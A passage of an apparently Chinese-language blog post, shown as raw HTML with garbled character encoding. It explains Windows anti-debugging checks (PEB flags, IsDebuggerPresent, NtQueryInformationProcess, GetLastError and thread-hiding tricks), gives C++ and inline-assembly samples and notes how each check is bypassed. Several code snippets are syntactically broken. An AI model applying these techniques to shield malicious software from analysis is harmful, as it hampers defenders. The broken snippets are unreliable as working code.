class="token operator">=</span> FS<span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">0x18</span><span class="token punctuation">]</span> <span class="token operator">=</span> TEB<span class="token punctuation">.</span>NtTib<span class="token punctuation">.</span>self <span class="token operator">=</span> TEB<span class="token punctuation">.</span>NtTib <span class="token operator">=</span> address of SEH <span class="token operator">=</span> address of TEBFS<span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">0x30</span><span class="token punctuation">]</span> <span class="token operator">=</span> TEB<span class="token punctuation">.</span>ProcessEnvironmentBlock <span class="token operator">=</span> address of PEB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="å¸¸è§é™æ€åè°ƒè¯•ï¼ˆåŸºæœ¬æ²¡ç”¨"><a href="#å¸¸è§é™æ€åè°ƒè¯•ï¼ˆåŸºæœ¬æ²¡ç”¨" class="headerlink" title="å¸¸è§é™æ€åè°ƒè¯•ï¼ˆåŸºæœ¬æ²¡ç”¨"></a>å¸¸è§é™æ€åè°ƒè¯•ï¼ˆåŸºæœ¬æ²¡ç”¨</h3><h4 id="PEBå­—æ®µåˆ©ç”¨"><a href="#PEBå­—æ®µåˆ©ç”¨" class="headerlink" title="PEBå­—æ®µåˆ©ç”¨"></a>PEBå­—æ®µåˆ©ç”¨</h4><h5 id="BeingDebuggedï¼ˆ002ï¼‰"><a href="#BeingDebuggedï¼ˆ002ï¼‰" class="headerlink" title="BeingDebuggedï¼ˆ002ï¼‰"></a>BeingDebuggedï¼ˆ002ï¼‰</h5><p>è¿›ç¨‹å¤„äºè°ƒè¯•çŠ¶æ€æ—¶ï¼ŒPEB.BeingDebuggedæˆå‘˜çš„å€¼è®¾ä¸ºé0ï¼Œåœ¨éè°ƒè¯•çŠ¶æ€ä¸‹ä¸º0;</p><ul><li>è·å–PEB.BeingDebugged</li></ul><pre class="line-numbers language-none"><code class="language-none">1)ç›´æ¥è·å–mov eax, FS:[0x30]movzx eax, Fs:[eax + 0x2]2)å…ˆè·å–TEB,å†è·å–PEBmov eax, FS:[0x18]//mov eax, FS:[0]mov eax, FS:[eax + 0x30]movzx eax, Fs:[eax + 0x2]3)APIè·å–(å…¶å®è¯¥APIå°±æ˜¯åˆ©ç”¨ä¸Šè¿°2)ä¸­çš„æ±‡ç¼–)IsDebuggerPresent() APIBOOL IsDebuggerPresent();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>æµ‹è¯•ï¼šç›´æ¥(VS)F5è°ƒè¯•å³å¯ï¼Œåœ¨ODä¸­æœ‰æ’ä»¶ä¼šç›´æ¥è¿‡æ‰åè°ƒè¯•ã€‚</li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int __declspec(naked) GetBeingBubugged() {__asm {push ebpmov ebp, espsub esp, 0x40push edipush esipush ebxpush ecxlea edi, dword ptr ds:[ebp-0x40]mov ecx, 0x10mov eax, 0xCCCCCCCCrep stos        //è¿™å°±æ˜¯IsDebuggerPresent()APIçš„æ ¸å¿ƒé€»è¾‘mov eax, dword ptr fs : [0x18]mov eax, dword ptr ds : [eax + 0x30]movzx eax, byte ptr ds : [eax + 0x2]pop ecxpop ebxpop esipop edimov esp, ebppop ebpret}}int main(){if (GetBeingBubugged()) {MessageBox(NULL, L"Funk You", L"AntiDebug", MB_OK);::ExitProcess(0);}system("pause");}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›´æ¥ctrl+F5æ—¶ï¼Œå¹¶æ²¡æœ‰å¼¹æ¡†ï¼›ä½†æ˜¯å½“F5è°ƒè¯•æ—¶ï¼Œå¼¹æ¡†ã€‚</p><p><img src="/2023/04/04/antibebug/0.png" alt="Ctr1+F5"></p><p><img src="/2023/04/04/antibebug/1.png" alt="F5"></p><ul><li>ç›´æ¥ä¿®æ”¹PEB.BeingDebuggedçš„å€¼æˆ–è€…IsDebuggerPresent() çš„è¿”å›å€¼å³å¯è¿‡æ‰(è¿™ä¸ªåè°ƒè¯•æ‹–å…¥ODå°±è¢«æ’ä»¶è¿‡æ‰äº†ï¼Œå°±ä¸æ¼”ç¤º)ã€‚</li></ul><h5 id="Ldrï¼ˆ00cï¼‰"><a href="#Ldrï¼ˆ00cï¼‰" class="headerlink" title="Ldrï¼ˆ00cï¼‰"></a>Ldrï¼ˆ00cï¼‰</h5><p>PEB.Ldr æŒ‡å‘_PEB_LDR_DATAç»“æ„ä½“æŒ‡é’ˆï¼Œ_PEB_LDR_DATAæ°å¥½æ˜¯åœ¨å †ä¸­åˆ›å»ºçš„ã€‚æ£€æµ‹_PEB_LDR_DATAæ˜¯å¦æ˜¯0xEEFEEEFEå³å¯åˆ¤æ–­æ˜¯å¦å¤„äºè¢«è°ƒè¯•ï¼›</p><ul><li>æµ‹è¯•ï¼šæˆ‘åœ¨è‡ªå·±ç”µè„‘ä¸Šå¹¶æ²¡æœ‰æ•ˆæœï¼Œçœ‹ç½‘ä¸Šè¯´è¿™ä¸ªæ–¹æ³•åœ¨win vistaä¹‹åå·²ç»æ— æ•ˆï¼Œä½†è¿˜æ˜¯è®°å½•ä¸€ä¸‹ã€‚</li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">//æ£€æµ‹Ldrï¼ŒWin XPæœ‰æ•ˆDWORD __declspec(naked) GetLdr() {__asm {push ebpmov ebp, espsub esp, 0x40push edipush ecxlea edi, dword ptr ds:[ebp-0x40]mov ecx, 0x10mov eax, 0xCCCCCCCCrep stosmov eax, dword ptr fs : [0x18]mov eax, dword ptr ds : [eax + 0x30]mov eax, dword ptr ds : [eax + 0xC]pop ecxpop edimov esp, ebppop ebpret }}int AntiDubugByGetLdr() {DWORD ldrAddr = GetLdr();DWORD data = 0;int i = 0;HANDLE handle = ::OpenProcess(PROCESS_ALL_ACCESS, false, ::GetCurrentProcessId());while (i &lt; 0x1000){ReadProcessMemory(handle, (LPVOID)ldrAddr, &amp;data, 4, NULL);//åˆ¤æ–­å†…å­˜ä¸­æ˜¯å¦å«æœ‰0xEEFEEEFEif (data == 0xEEFEEEFE)return 1;ldrAddr += 4;i++;}return 0;}int main(){if (AntiDubugByGetLdr()) {MessageBox(NULL, L"Funk You", L"AntiDebug", MB_OK);::ExitProcess(0);}system("pause");}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>å°†å¡«å……ç€0xEEFEEEFEçš„åŒºåŸŸå†™ä¸ºNULLå³å¯è¿‡æ‰</li></ul><h5 id="ProcessHeapï¼ˆ018ï¼‰"><a href="#ProcessHeapï¼ˆ018ï¼‰" class="headerlink" title="ProcessHeapï¼ˆ018ï¼‰"></a>ProcessHeapï¼ˆ018ï¼‰</h5><p>ç¨‹åºæ­£å¸¸è¿è¡Œæ—¶ï¼ŒProcessHeap.Flags=0x2ï¼ŒProcessHeap.ForceFlags=0ï¼Œè°ƒè¯•æ—¶ä¼šå‘ç”Ÿå˜åŒ–ï¼›</p><p>Win 7ä¹‹åï¼šProcessHeap.Flagsåç§»ä¸º0x40ï¼ŒProcessHeap.ForceFlagsåç§»ä¸ºx44ï¼›</p><ul><li>æµ‹è¯•ï¼šä¹‹å‰xpè™šæ‹Ÿæœºè¢«ç©åäº†ï¼‰Win 10æµ‹è¯• <strong>æˆ‘å‘ç°å¥½åƒæ²¡æœ‰ç”¨ï¼Œä¸ç®¡æ˜¯å¦è°ƒè¯•ï¼ŒFlags==0x2ï¼ŒForceFlags==0</strong>ï¼›</li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void AntiDebugByProcessHeap() {DWORD Flags;DWORD ForceFlags;__asm {push eax;mov eax, fs:[0x30];mov eax, ds:[eax + 0x18];mov eax, dword ptr[eax + 0x40]mov dword ptr[Flags], eax;mov eax, fs:[0x30];mov eax, ds:[eax + 0x18];mov eax, dword ptr[eax + 0x44]mov dword ptr[ForceFlags], eax;pop eax;}std::cout &lt;&lt; Flags &lt;&lt; std::endl &lt;&lt; ForceFlags &lt;&lt; std::endl;if (Flags != 2 || ForceFlags != 0) {MessageBox(NULL, L"Funk You", L"AntiDebug", MB_OK);::ExitProcess(0);}else {std::cout &lt;&lt; "Hello World!\n";}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="NtGlobalFlagï¼ˆ068ï¼‰"><a href="#NtGlobalFlagï¼ˆ068ï¼‰" class="headerlink" title="NtGlobalFlagï¼ˆ068ï¼‰"></a>NtGlobalFlagï¼ˆ068ï¼‰</h5><p>è°ƒè¯•è¿›ç¨‹æ—¶ï¼ŒPEB.NtGlobalFlagä¼šè¢«ç½®ä¸º0x70ï¼›</p><ul><li>æµ‹è¯•ï¼šWin 10æµ‹è¯• <strong>å¥½åƒè¿˜æ˜¯æ²¡æœ‰ç”¨ï¼Œä¸ç®¡æ˜¯å¦è°ƒè¯•ï¼ŒNtGlobalFlag==0</strong>ï¼›</li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void AntiDebugByNtGlobalFlag() {DWORD Flags;__asm {push eax;mov eax, fs:[0x30];mov eax, [eax + 0x68]mov dword ptr[Flags], eax;pop eax;}std::cout &lt;&lt; Flags &lt;&lt; std::endl;if (Flags == 0x70) {MessageBox(NULL, L"Funk You", L"AntiDebug", MB_OK);::ExitProcess(0);}else {std::cout &lt;&lt; "Hello World!\n";}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Windows-APIçš„åˆ©ç”¨"><a href="#Windows-APIçš„åˆ©ç”¨" class="headerlink" title="Windows APIçš„åˆ©ç”¨"></a>Windows APIçš„åˆ©ç”¨</h4><h5 id="IsDebuggerPresent"><a href="#IsDebuggerPresent" class="headerlink" title="IsDebuggerPresent"></a>IsDebuggerPresent</h5><p>IsDebuggerPresentæŸ¥è¯¢è¿›ç¨‹ç¯å¢ƒå—(PEB)ä¸­çš„IsDebuggedæ ‡å¿—ã€‚</p><ul><li>å¦‚æœè¿›ç¨‹æ²¡æœ‰è¿è¡Œåœ¨è°ƒè¯•å™¨ç¯å¢ƒä¸­ï¼Œå‡½æ•°è¿”å›0ï¼›</li><li>å¦‚æœè°ƒè¯•é™„åŠ äº†è¿›ç¨‹ï¼Œå‡½æ•°è¿”å›ä¸€ä¸ªéé›¶å€¼ã€‚</li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">BOOL IsDebuggerPresent();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="CheckRemoteDebuggerPresent"><a href="#CheckRemoteDebuggerPresent" class="headerlink" title="CheckRemoteDebuggerPresent"></a>CheckRemoteDebuggerPresent</h5><p>CheckRemoteDebuggerPresentåŒIsDebuggerPresentå‡ ä¹ä¸€è‡´ã€‚å®ƒä¸ä»…å¯ä»¥æ¢æµ‹ç³»ç»Ÿå…¶ä»–è¿›ç¨‹æ˜¯å¦è¢«è°ƒè¯•ï¼Œé€šè¿‡ä¼ é€’è‡ªèº«è¿›ç¨‹å¥æŸ„è¿˜å¯ä»¥æ¢æµ‹è‡ªèº«æ˜¯å¦è¢«è°ƒè¯•ã€‚</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">BOOL CheckRemoteDebuggerPresent(  [in]      HANDLE hProcess,  [in, out] PBOOL  pbDebuggerPresent);/*[in] hProcessè¿›ç¨‹çš„å¥æŸ„ã€‚[in, out] pbDebuggerPresentå¦‚æœæ­£åœ¨è°ƒè¯•æŒ‡å®šçš„è¿›ç¨‹ï¼Œåˆ™å‡½æ•°è®¾ç½®ä¸º TRUE çš„å˜é‡çš„æŒ‡é’ˆï¼Œå¦åˆ™ä¸º FALSEã€‚*/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="NtQueryInformationProcess"><a href="#NtQueryInformationProcess" class="headerlink" title="NtQueryInformationProcess"></a>NtQueryInformationProcess</h5><p>è¯¥å‡½æ•°æ£€ç´¢æœ‰å…³æŒ‡å®šè¿›ç¨‹çš„ä¿¡æ¯ï¼Œæ˜¯ntdll.dllä¸­ä¸€ä¸ªæœªå…¬å¼€çš„APIå‡½æ•°ï¼Œéœ€è¦è‡ªå·±åŠ è½½ï¼›</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">NTSYSAPI NTSTATUS NTAPI NtQueryInformationProcess (ã€€ã€€IN HANDLE ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ProcessHandle, ã€€ã€€ã€€ã€€ã€€ã€€ // è¿›ç¨‹å¥æŸ„ã€€ã€€IN PROCESSINFOCLASS ã€€ã€€InformationClass, ã€€ã€€ã€€ã€€ // ä¿¡æ¯ç±»å‹ã€€ã€€OUT PVOID ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ProcessInformation, ã€€ã€€ã€€ // ç¼“å†²æŒ‡é’ˆã€€ã€€IN ULONG ã€€ã€€ã€€ã€€ã€€ã€€ ã€€ã€€ProcessInformationLength, // ä»¥å­—èŠ‚ä¸ºå•ä½çš„ç¼“å†²å¤§å°ã€€ã€€OUT PULONG ã€€ã€€ã€€ã€€ã€€ ã€€ã€€ReturnLength OPTIONAL     // å†™å…¥ç¼“å†²çš„å­—èŠ‚æ•°);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> ä¸è°ƒè¯•æœ‰å…³çš„ç¬¬äºŒä¸ªå‚æ•°(InformationClass)çš„å€¼:<br> ProcessDebugPort(0x07) , ProcessDebugObjectHandle(0x1E) , ProcessDebugFlags(0x1F)<br> ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šä¸åŒçš„å€¼ , è¿”å›ç»“æœä¼šè¿”å›åœ¨ ProcessInformation(ç¬¬ä¸‰ä¸ªå‚æ•°)ï¼›</p><ul><li><p>ProcessDebugPort(0x07)</p></li><li><p>è¿›ç¨‹å¤„äºè°ƒè¯•çŠ¶æ€æ—¶,æ“ä½œç³»ç»Ÿä¼šä¸ºä»–åˆ†é…1ä¸ªè°ƒè¯•ç«¯å£(debug port) , InformationClassè®¾ä¸ºProcessDebugPort(0x07) æ—¶,è°ƒç”¨NtQueryInformationProcess()å‡½æ•°å°±å¯ä»¥è·å–è°ƒè¯•ç«¯å£.ã€‚<br> <strong>è‹¥å¤„äºè°ƒè¯•çŠ¶æ€ ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¼šè¢«ç½®ä¸º0xFFFFFFFF(-1)<br> è‹¥å¤„äºéè°ƒè¯•çŠ¶æ€ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°å€¼ä¼šè¢«è®¾ç½®ä¸º0ï¼›</strong></p></li><li><p>CheckRemoteDebuggerPresent() API<br>å®é™…ä¸Šä¹Ÿæ˜¯è°ƒç”¨äº†NtQueryInformationProcess(ProcessDebugPort)</p></li><li><p>ProcessDebugObjectHandle(0x1E)</p><ul><li>è°ƒè¯•è¿›ç¨‹æ—¶ï¼Œä¼šç”Ÿæˆä¸€ä¸ªè°ƒè¯•å¯¹è±¡(Debug Obiect)ã€‚NtQueryInformationProcess()ç¬¬äºŒä¸ªå‚æ•°å€¼ä¸º0x1Eæ—¶ , å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°å°±èƒ½è·å–åˆ°è°ƒè¯•å¯¹è±¡å¥æŸ„ ã€‚<br><strong>è¿›ç¨‹å¤„äºè°ƒè¯•çŠ¶æ€==&gt;è°ƒè¯•å¥æŸ„å­˜åœ¨==&gt;è¿”å›å€¼ä¸ä¸ºNULL<br>å¤„äºéè°ƒè¯•çŠ¶æ€ , è¿”å›å€¼ä¸ºNULLï¼›</strong></li></ul></li><li><p>ProcessDebugFlags(0x1F)</p></li><li><p>è°ƒè¯•æ ‡å¿—:Debug Flagsï¼Œæ£€æµ‹è°ƒè¯•æ ‡å¿—çš„å€¼ä¹Ÿå¯ä»¥åˆ¤æ–­è¿›ç¨‹æ˜¯å¦å¤„äºè¢«è°ƒè¯•çŠ¶æ€ï¼›<br>NtQueryInformationProcess()ç¬¬äºŒä¸ªå‚æ•°ä¸º0x1F<br><strong>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šè°ƒè¯•çŠ¶æ€ï¼š0ï¼Œéè°ƒè¯•çŠ¶æ€ï¼š1ï¼›</strong></p></li></ul><p>æµ‹è¯•ä»£ç ï¼šwin 10å¯ä»¥æµ‹è¯•æˆåŠŸï¼›<strong>Noteï¼š</strong>å®šä¹‰å‡½æ•°æŒ‡é’ˆæ—¶ï¼Œæˆ‘åœ¨win10ä¸­æ²¡æœ‰æ‰¾åˆ°PROCESSINFOCLASSè¿™ä¸ªæ•°æ®ç±»å‹ï¼Œä½†æ˜¯å®ƒçš„æœ¬è´¨å°±æ˜¯ä¸€ä¸ªâ€™æ•´æ•°â€™ï¼Œæ‰€ä»¥å®šä¹‰æˆDWORDå°±è¡Œã€‚</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">typedef NTSTATUS(WINAPI *PNtQueryInformationProcess)(_In_      HANDLE           ProcessHandle,_In_      DWORD   ProcessInformationClass,_Out_     PVOID            ProcessInformation,_In_      ULONG            ProcessInformationLength,_Out_opt_ PULONG           ReturnLength);void AntiDebugByNtQueryInformationProcess() {HMODULE ntdll = LoadLibrary(TEXT("Ntdll.dll"));if (ntdll == NULL) {std::cout &lt;&lt; "ntdllåŠ è½½å¤±è´¥" &lt;&lt; std::endl;::ExitProcess(0);}PNtQueryInformationProcess NtQueryInformationProcess = (PNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");if (NtQueryInformationProcess == NULL) {std::cout &lt;&lt; "å‡½æ•°å¯¼å…¥å¤±è´¥" &lt;&lt; std::endl;::ExitProcess(1);}DWORD isDebuggerPresent0 = FALSE;DWORD isDebuggerPresent1 = FALSE;DWORD isDebuggerPresent2 = FALSE;HANDLE handle = ::GetCurrentProcess();NTSTATUS status0 = NtQueryInformationProcess(handle, 0x7, &amp;isDebuggerPresent0, sizeof(DWORD), NULL);NTSTATUS status1 = NtQueryInformationProcess(handle, 0x1E, &amp;isDebuggerPresent1, sizeof(DWORD), NULL);NTSTATUS status2 = NtQueryInformationProcess(handle, 0x1F, &amp;isDebuggerPresent2, sizeof(DWORD), NULL);std::cout &lt;&lt; isDebuggerPresent0 &lt;&lt; std::endl &lt;&lt; isDebuggerPresent1 &lt;&lt; std::endl &lt;&lt; isDebuggerPresent2 &lt;&lt; std::endl;if (!status0 &amp;&amp; !status1 &amp;&amp; !status2 &amp;&amp; isDebuggerPresent0 &amp;&amp; isDebuggerPresent1 &amp;&amp; !isDebuggerPresent2){MessageBoxA(NULL, "Debug detected", "NtQueryInformationProcess", MB_OK);return;}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/04/antibebug/2.png"></p><h5 id="NtQuerySystemInformation"><a href="#NtQuerySystemInformation" class="headerlink" title="NtQuerySystemInformation"></a>NtQuerySystemInformation</h5><h5 id="NtQueryObject"><a href="#NtQueryObject" class="headerlink" title="NtQueryObject"></a>NtQueryObject</h5><h5 id="GetLastError"><a href="#GetLastError" class="headerlink" title="GetLastError"></a>GetLastError</h5><ul><li><p>ç¼–å†™åº”ç”¨ç¨‹åºæ—¶ï¼Œç»å¸¸éœ€è¦æ¶‰åŠåˆ°é”™è¯¯å¤„ç†é—®é¢˜ã€‚è®¸å¤šå‡½æ•°è°ƒç”¨åªç”¨TRUEå’ŒFALSEæ¥è¡¨æ˜å‡½æ•°çš„è¿è¡Œç»“æœã€‚ä¸€æ—¦å‡ºç°é”™è¯¯ï¼ŒMSDNä¸­å¾€å¾€ä¼šæŒ‡å‡ºè¯·ç”¨GetLastError()å‡½æ•°æ¥è·å¾—é”™è¯¯åŸå› ã€‚æ¶æ„ä»£ç å¯ä»¥ä½¿ç”¨å¼‚å¸¸æ¥ç ´åæˆ–è€…æ¢æµ‹è°ƒè¯•å™¨ã€‚</p></li><li><p>è°ƒè¯•å™¨æ•è·å¼‚å¸¸åï¼Œå¹¶ä¸ä¼šç«‹å³å°†å¤„ç†æƒè¿”å›è¢«è°ƒè¯•è¿›ç¨‹å¤„ç†ï¼Œå¤§å¤šæ•°åˆ©ç”¨å¼‚å¸¸çš„åè°ƒè¯•æŠ€æœ¯å¾€å¾€æ®æ­¤æ¥æ£€æµ‹è°ƒè¯•å™¨ã€‚å¤šæ•°è°ƒè¯•å™¨é»˜è®¤çš„è®¾ç½®æ˜¯æ•è·å¼‚å¸¸åä¸å°†å¼‚å¸¸ä¼ é€’ç»™åº”ç”¨ç¨‹åºã€‚å¦‚æœè°ƒè¯•å™¨ä¸èƒ½å°†å¼‚å¸¸ç»“æœæ­£ç¡®è¿”å›åˆ°è¢«è°ƒè¯•è¿›ç¨‹ï¼Œé‚£ä¹ˆè¿™ç§å¼‚å¸¸å¤±æ•ˆå¯ä»¥è¢«è¿›ç¨‹å†…éƒ¨çš„å¼‚å¸¸å¤„ç†æœºåˆ¶æ¢æµ‹ã€‚</p></li><li><p>å¯¹äºOutputDebugStringå‡½æ•°ï¼Œå®ƒçš„ä½œç”¨æ˜¯åœ¨è°ƒè¯•å™¨ä¸­æ˜¾ç¤ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼ŒåŒæ—¶å®ƒä¹Ÿå¯ä»¥ç”¨æ¥æ¢æµ‹è°ƒè¯•å™¨çš„å­˜åœ¨ã€‚<strong>ä½¿ç”¨SetLastErrorå‡½æ•°ï¼Œå°†å½“å‰çš„é”™è¯¯ç è®¾ç½®ä¸ºä¸€ä¸ªä»»æ„å€¼ã€‚</strong></p><ul><li><strong>å¦‚æœè¿›ç¨‹æ²¡æœ‰è¢«è°ƒè¯•å™¨é™„åŠ </strong>ï¼Œè°ƒç”¨OutputDebugStringå‡½æ•°ä¼šå¤±è´¥ï¼Œé”™è¯¯ç ä¼šé‡æ–°è®¾ç½®ï¼Œ<strong>å› æ­¤GetLastErrorè·å–çš„é”™è¯¯ç åº”è¯¥ä¸æ˜¯æˆ‘ä»¬è®¾ç½®çš„ä»»æ„å€¼</strong>ã€‚</li><li><strong>å¦‚æœè¿›ç¨‹è¢«è°ƒè¯•å™¨é™„åŠ </strong>ï¼Œè°ƒç”¨OutputDebugStringå‡½æ•°ä¼šæˆåŠŸï¼Œ<strong>è¿™æ—¶GetLastErrorè·å–çš„é”™è¯¯ç åº”è¯¥æ²¡æ”¹å˜</strong>ã€‚</li></ul></li><li><p>å¯¹äºDeleteFiberå‡½æ•°ï¼Œå¦‚æœç»™å®ƒä¼ é€’ä¸€ä¸ªæ— æ•ˆçš„å‚æ•°çš„è¯ä¼šæŠ›å‡ºERROR_INVALID_PARAMETERå¼‚å¸¸ã€‚å¦‚æœè¿›ç¨‹æ­£åœ¨è¢«è°ƒè¯•çš„è¯ï¼Œå¼‚å¸¸ä¼šè¢«è°ƒè¯•å™¨æ•è·ã€‚æ‰€ä»¥ï¼ŒåŒæ ·å¯ä»¥é€šè¿‡éªŒè¯LastErrorå€¼æ¥æ£€æµ‹è°ƒè¯•å™¨çš„å­˜åœ¨ã€‚å¦‚ä»£ç æ‰€ç¤ºï¼Œ<strong>0x57å°±æ˜¯æŒ‡ERROR_INVALID_PARAMETERã€‚</strong></p></li><li><p>åŒæ ·è¿˜å¯ä»¥ä½¿ç”¨CloseHandleã€CloseWindowäº§ç”Ÿå¼‚å¸¸ï¼Œä½¿å¾—é”™è¯¯ç æ”¹å˜ã€‚</p></li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">BOOL CheckDebug0(){     DWORD errorValue = 12345;      SetLastError(errorValue);      OutputDebugString("Test for debugger!");      if (GetLastError() == errorValue)          return TRUE;      return FALSE;  }BOOL CheckDebug1() {      char fib[1024] = {0};      DeleteFiber(fib);      return (GetLastError() != 0x57);  }  BOOL CheckDebug2()       DWORD ret = CloseHandle((HANDLE)0x1234);      if (ret != 0 || GetLastError() != RROR_INVALID_HANDLE) {         return TRUE;      return FALSE;}  BOOL CheckDebug3() {      DWORD ret = CloseWindow((HWND)0x1234);      if (ret != 0 || GetLastError() != ERROR_INVALID_WINDOW_HANDLE) {          return TRUE;       return FALSE;  }  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="ZwSetInformationThread"><a href="#ZwSetInformationThread" class="headerlink" title="ZwSetInformationThread"></a>ZwSetInformationThread</h5><p>ZwSetInformationThreadæ‹¥æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œ</p><ul><li>ç¬¬ä¸€ä¸ªå‚æ•°ç”¨æ¥æ¥æ”¶å½“å‰çº¿ç¨‹çš„å¥æŸ„ï¼Œç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºçº¿ç¨‹ä¿¡æ¯ç±»å‹ï¼Œè‹¥å…¶å€¼è®¾ç½®ä¸ºThreadHideFromDebugger(0x11)ï¼Œä½¿ç”¨è¯­å¥ZwSetInformationThread(GetCurrentThread(), ThreadHideFromDebugger, NULL, 0);è°ƒç”¨è¯¥å‡½æ•°åï¼Œè°ƒè¯•è¿›ç¨‹å°±ä¼šè¢«åˆ†ç¦»å‡ºæ¥ã€‚</li><li>è¯¥å‡½æ•°ä¸ä¼šå¯¹æ­£å¸¸è¿è¡Œçš„ç¨‹åºäº§ç”Ÿä»»ä½•å½±å“ï¼Œä½†è‹¥è¿è¡Œçš„æ˜¯è°ƒè¯•å™¨ç¨‹åºï¼Œ<strong>å› ä¸ºè¯¥å‡½æ•°éšè—äº†å½“å‰çº¿ç¨‹ï¼Œè°ƒè¯•å™¨æ— æ³•å†æ”¶åˆ°è¯¥çº¿ç¨‹çš„è°ƒè¯•äº‹ä»¶ï¼Œæœ€ç»ˆåœæ­¢è°ƒè¯•</strong>ã€‚è¿˜æœ‰ä¸€ä¸ªå‡½æ•°DebugActiveProcessStopç”¨æ¥åˆ†ç¦»è°ƒè¯•å™¨å’Œè¢«è°ƒè¯•è¿›ç¨‹ï¼Œä»è€Œåœæ­¢è°ƒè¯•ã€‚ä¸¤ä¸ªAPIå®¹æ˜“æ··æ·†ï¼Œéœ€è¦ç‰¢è®°å®ƒä»¬çš„åŒºåˆ«ã€‚</li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">typedef enum _THREAD_INFORMATION_CLASS {       ThreadBasicInformation,       ThreadTimes,       ThreadPriority,       ThreadBasePriority,       ThreadAffinityMask,       ThreadImpersonationToken,       ThreadDescriptorTableEntry,       ThreadEnableAlignmentFaultFixup,       ThreadEventPair,       ThreadQuerySetWin32StartAddress,       ThreadZeroTlsCell,       ThreadPerformanceCount,       ThreadAmILastThread,       ThreadIdealProcessor,       ThreadPriorityBoost,       ThreadSetTlsArrayAddress,       ThreadIsIoPending,       ThreadHideFromDebugger           // 17 (0x11)   } THREAD_INFORMATION_CLASS, *PTHREAD_INFORMATION_CLASS;typedef NTSTATUS (WINAPI* ZWSETINFORMATIONTHREAD)(       HANDLE ThreadHandle,       THREAD_INFORMATION_CLASS ThreadInformationClass,       PVOID ThreadInformation,       ULONG ThreadInformationLength   );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ETC"><a href="#ETC" class="headerlink" title="ETC"></a>ETC</h4><h4 id="TLSå›è°ƒå‡½æ•°"><a href="#TLSå›è°ƒå‡½æ•°" class="headerlink" title="TLSå›è°ƒå‡½æ•°"></a>TLSå›è°ƒå‡½æ•°</h4><h5 id="TSLå˜é‡"><a href="#TSLå˜é‡" class="headerlink" title="TSLå˜é‡"></a>TSLå˜é‡</h5><p>TLSï¼šThread Local 